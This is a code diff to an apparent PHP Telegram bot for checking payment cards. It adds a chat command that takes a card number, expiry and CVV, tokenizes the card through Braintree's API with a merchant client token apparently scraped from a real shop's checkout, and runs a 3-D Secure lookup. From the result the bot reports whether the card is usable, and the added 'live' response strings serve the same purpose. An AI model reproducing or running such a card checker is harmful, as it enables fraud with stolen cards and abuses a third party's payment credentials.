@@ -315,6 +315,7 @@ $live_array = array(
     '"cvc_check": "fail"',
     '"cvc_check": "pass"',
     '"status": "succeeded"',
+    'Rejected: avs',
     'Your payment has already been processed',
     'Nice! New payment method added',
     'Approved',
@@ -2232,6 +2233,128 @@ ob_flush();
 
  }
 
+
+elseif((strpos($message, "!av") === 0)||(strpos($message, "/av") === 0)||(strpos($message, ".av") === 0)){
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = trim($i[0]);
+$mes   = trim($i[1]);
+$ano   = trim($i[2]);
+$cvv   = trim($i[3]);
+
+$bin = substr($lista, 0, 6);
+
+$verify = substr($cc, 16, 1);
+        if($verify != ""){
+                $respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+                sendMessage($chat_id,$respuesta, $message_id);
+                die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+
+}else{
+        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ho cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ho cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ho cc|m|y|cvv\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
+}
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+
+
+$curl = curl_init();
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bcd52377-7c10-42f9-bb40-220f5b780c74"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Content-Type: application/json',
+    'sec-ch-ua-platform: "Android"',
+    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUzNDc4MDYsImp0aSI6ImEyOTA1NzE3LWJkMmUtNDg1Ny1hY2Q1LTc3NzU5ZmFiMzJkMyIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.XuYx-oW-xiQf72Clu0SjML4knZc4RpIqYPe6_PtXoZ4xIxoLwvH2yMtQlodJkoZOczuhKRgnfK9VnwNANMDjBw',
+    'braintree-version: 2018-05-10',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://assets.braintreegateway.com',
+    'sec-fetch-site: cross-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://assets.braintreegateway.com/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response,true);
+curl_close($curl);
+
+$token = $json["data"]["tokenizeCreditCard"]["token"];
+
+
+$curl = curl_init();
+
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.braintreegateway.com/merchants/vp9b39r7c3b9tmpj/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"amount":"35.00","additionalInfo":{"billingLine1":"1008 Alum Rock Road","billingCity":"Birmingham","billingPostalCode":"B8 2LS","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Carlos","billingSurname":"Perez"},"challengeRequested":[true,true],"bin":"518189","dfReferenceId":"0_7980d840-ef23-4cf4-9fd1-e54b01024e38","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":4,"issuerDeviceDataCollectionTimeElapsed":0,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUzNDc4MDYsImp0aSI6ImEyOTA1NzE3LWJkMmUtNDg1Ny1hY2Q1LTc3NzU5ZmFiMzJkMyIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.XuYx-oW-xiQf72Clu0SjML4knZc4RpIqYPe6_PtXoZ4xIxoLwvH2yMtQlodJkoZOczuhKRgnfK9VnwNANMDjBw","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.grahamandgreen.co.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"bcd52377-7c10-42f9-bb40-220f5b780c74"}}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Content-Type: application/json',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.9',
+    'origin: https://www.grahamandgreen.co.uk',
+    'sec-fetch-site: cross-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://www.grahamandgreen.co.uk/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+$json_obj = json_decode($response, true);
+
+$status = $json_obj["paymentMethod"]["threeDSecureInfo"]["status"];
+$acs_url = $json_obj["paymentMethod"]["threeDSecureInfo"]["acsUrl"];
+
+echo "Status: $status\n";
+echo "AcsUrl: $acs_url\n";
+
+if (!empty($acs_url) || $status == "challenge_required"){
+$response = "Rejected: avs";
+}else{
+$respo = $status;
+}
 	
 
 elseif((strpos($message, "!na") === 0)||(strpos($message, "/na") === 0)||(strpos($message, ".na") === 0)){
